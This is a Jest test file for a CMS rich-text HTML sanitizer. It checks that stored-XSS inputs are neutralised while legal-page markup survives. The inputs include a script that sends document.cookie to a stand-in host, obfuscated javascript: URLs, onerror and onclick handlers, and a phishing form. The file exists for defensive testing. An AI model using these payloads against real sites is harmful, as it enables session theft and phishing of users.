import { sanitizeRichTextHtml } from "./rich-text.sanitizer";

/**
 * Two things have to be true at once, and each of these blocks asserts one of them.
 *
 * A sanitizer that strips everything is safe and useless — legal and corporate pages are headings,
 * lists, links and tables, and losing them would make the CMS unable to hold the content it exists
 * for. A sanitizer that preserves everything is useful and dangerous. The tests are written as
 * pairs where possible: the attack, and the ordinary markup nearest to it that must survive.
 *
 * The malicious inputs below are the standard stored-XSS repertoire, not exotica: the ones a
 * compromised editor account, a bad paste from a web page, or a future content import would
 * plausibly deliver.
 */

/** Asserts the output cannot execute — no script host, no handler, no javascript: URL. */
function expectInert(output: string): void {
  const lowered = output.toLowerCase();

  expect(lowered).not.toContain("<script");
  expect(lowered).not.toContain("javascript:");
  expect(lowered).not.toContain("onerror");
  expect(lowered).not.toContain("onload");
  expect(lowered).not.toContain("onclick");
  expect(lowered).not.toContain("onmouseover");
  expect(lowered).not.toContain("<iframe");
  expect(lowered).not.toContain("<object");
  expect(lowered).not.toContain("<embed");
  expect(lowered).not.toContain("srcdoc");
}

describe("sanitizeRichTextHtml — malicious upstream content", () => {
  it("removes a script element and does not leave its source as visible prose", () => {
    const output = sanitizeRichTextHtml(
      '<p>Before</p><script>fetch("https://evil.test?c="+document.cookie)</script><p>After</p>',
    );

    expectInert(output);
    // The script's TEXT must go with the tag. Stripping the tag alone would print the payload as a
    // paragraph in the middle of a legal page.
    expect(output).not.toContain("document.cookie");
    expect(output).toContain("<p>Before</p>");
    expect(output).toContain("<p>After</p>");
  });

  it("removes event-handler attributes while keeping the element and its text", () => {
    const output = sanitizeRichTextHtml(
      `<p onclick="steal()" onmouseover="steal()">Our liability is limited as set out below.</p>`,
    );

    expectInert(output);
    expect(output).toContain("Our liability is limited as set out below.");
    expect(output).not.toContain("steal()");
  });

  it("drops a javascript: href but keeps the link text", () => {
    const output = sanitizeRichTextHtml(`<p><a href="javascript:alert(1)">Read the policy</a></p>`);

    expectInert(output);
    expect(output).toContain("Read the policy");
  });

  it.each([
    ["entity-encoded scheme", `<a href="&#106;avascript:alert(1)">x</a>`],
    ["whitespace-split scheme", `<a href="java\tscript:alert(1)">x</a>`],
    ["newline-split scheme", `<a href="java\nscript:alert(1)">x</a>`],
    ["mixed case", `<a href="JaVaScRiPt:alert(1)">x</a>`],
    ["leading whitespace", `<a href="   javascript:alert(1)">x</a>`],
  ])("defeats an obfuscated javascript: URL — %s", (_label, input) => {
    // The reason this is a parser-based library and not a regex: each of these is a different
    // encoding of the same scheme, and a pattern that catches four of them ships the fifth.
    expectInert(sanitizeRichTextHtml(input));
  });

  it("drops a data: URL, which is a same-origin script delivery mechanism", () => {
    const output = sanitizeRichTextHtml(
      `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Download</a>`,
    );

    expect(output).not.toContain("data:text/html");
    expect(output).toContain("Download");
  });

  it("removes unsafe embeds entirely", () => {
    const output = sanitizeRichTextHtml(
      '<iframe src="https://evil.test"></iframe>' +
        '<object data="x.swf"></object>' +
        '<embed src="x.swf">' +
        '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    );

    expectInert(output);
  });

  it("removes an img with an onerror handler", () => {
    // `img` is not on the allow-list at all — no upload collection exists, so editorial content
    // cannot legitimately carry one yet.
    const output = sanitizeRichTextHtml('<img src="x" onerror="alert(1)">');

    expectInert(output);
    expect(output).not.toContain("<img");
  });

  it("removes style elements and style attributes, so nothing can restyle the page", () => {
    const output = sanitizeRichTextHtml(
      '<style>body{display:none}</style><p style="position:fixed;inset:0">Terms</p>',
    );

    expect(output).not.toContain("<style");
    expect(output).not.toContain("display:none");
    expect(output).not.toContain("position:fixed");
    expect(output).toContain("Terms");
  });

  it("removes form controls, so no page can phish under the company's own domain", () => {
    const output = sanitizeRichTextHtml(
      '<form action="https://evil.test"><input name="password"><button>Sign in</button></form>',
    );

    expect(output).not.toContain("<form");
    expect(output).not.toContain("<input");
    expect(output).not.toContain("<button");
  });

  it("removes svg, which reopens script execution through foreign-content parsing", () => {
    const output = sanitizeRichTextHtml("<svg><script>alert(1)</script></svg>");

    expectInert(output);
    expect(output).not.toContain("<svg");
  });

  it("survives malformed and mis-nested markup without letting a payload through", () => {
    const output = sanitizeRichTextHtml(
      "<p><b>Unclosed<script>alert(1)</p></b><<script>x</script>",
    );

    expectInert(output);
  });

  it("removes HTML comments", () => {
    expect(sanitizeRichTextHtml("<!-- internal: do not publish --><p>Public</p>")).not.toContain(
      "do not publish",
    );
  });

  it("adds rel=noopener noreferrer to any link opening a new tab", () => {
    const output = sanitizeRichTextHtml(
      '<a href="https://example.test" target="_blank">Partner</a>',
    );

    // Applied by the sanitizer rather than trusted from the editor, so it holds for every link.
    expect(output).toContain('rel="noopener noreferrer"');
  });
});

describe("sanitizeRichTextHtml — ordinary editorial markup survives", () => {
  it("preserves the structure a legal page is actually made of", () => {
    const input = [
      '<div class="payload-richtext">',
      "<h2>1. Scope</h2>",
      "<p>These terms apply to <strong>all</strong> orders, <em>including</em> samples.</p>",
      "<ul><li>Definitions</li><li>Liability</li></ul>",
      '<ol start="3"><li>Governing law</li></ol>',
      "<blockquote>Indicative data only.</blockquote>",
      '<p><a href="https://example.test/policy">Full policy</a></p>',
      "<hr>",
      '<table><thead><tr><th scope="col">Term</th></tr></thead><tbody><tr><td>Delivery</td></tr></tbody></table>',
      "</div>",
    ].join("");

    const output = sanitizeRichTextHtml(input);

    for (const fragment of [
      "<h2>1. Scope</h2>",
      "<strong>all</strong>",
      "<em>including</em>",
      "<ul>",
      "<li>Definitions</li>",
      '<ol start="3">',
      "<blockquote>",
      '<a href="https://example.test/policy">Full policy</a>',
      "<hr />",
      "<table>",
      '<th scope="col">Term</th>',
      "<td>Delivery</td>",
      'class="payload-richtext"',
    ]) {
      expect(output).toContain(fragment);
    }
  });

  it("preserves mailto and tel links, which contact copy needs", () => {
    const output = sanitizeRichTextHtml(
      '<p><a href="mailto:x@example.test">Email</a> <a href="tel:+10000000">Call</a></p>',
    );

    expect(output).toContain('href="mailto:x@example.test"');
    expect(output).toContain('href="tel:+10000000"');
  });

  it("preserves headings, inline code and the remaining inline marks", () => {
    const output = sanitizeRichTextHtml(
      "<h3>Note</h3><p><u>underlined</u> <s>struck</s> <sub>2</sub> <sup>3</sup> <code>SN 150</code></p>",
    );

    for (const tag of ["<h3>", "<u>", "<s>", "<sub>", "<sup>", "<code>"]) {
      expect(output).toContain(tag);
    }
  });

  it("escapes rather than drops text that merely looks like markup", () => {
    const output = sanitizeRichTextHtml(
      "<p>Use the &lt;code&gt; element. 5 &lt; 10 &amp; 10 &gt; 5.</p>",
    );

    expect(output).toContain("&lt;code&gt;");
    expect(output).toContain("&amp;");
  });

  it("returns an empty string for a missing body rather than throwing", () => {
    // A page with no body is a CMS condition, not an error this layer should raise.
    expect(sanitizeRichTextHtml(undefined)).toBe("");
    expect(sanitizeRichTextHtml(null)).toBe("");
    expect(sanitizeRichTextHtml("")).toBe("");
    expect(sanitizeRichTextHtml({ root: {} })).toBe("");
  });

  it("is idempotent — sanitizing already-sanitized output changes nothing", () => {
    const once = sanitizeRichTextHtml(
      '<div class="payload-richtext"><p>Hello <a href="https://example.test">link</a></p></div>',
    );

    expect(sanitizeRichTextHtml(once)).toBe(once);
  });
});
